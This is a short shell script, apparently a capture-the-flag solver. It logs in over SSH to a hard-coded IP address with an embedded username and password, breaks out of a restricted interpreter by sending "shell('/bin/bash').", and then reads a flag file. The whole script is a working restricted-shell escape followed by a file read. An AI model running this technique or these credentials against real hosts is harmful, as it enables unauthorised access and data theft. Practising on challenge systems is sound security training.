#!/bin/sh

HOST='95.179.148.72'
USER='pro'
PASS='iamthepr0'

(
sleep 2
echo "$PASS"
sleep 2
echo "shell('/bin/bash')."
sleep 2
echo "cat /home/user/flag.txt"
) | ssh $USER@$HOST
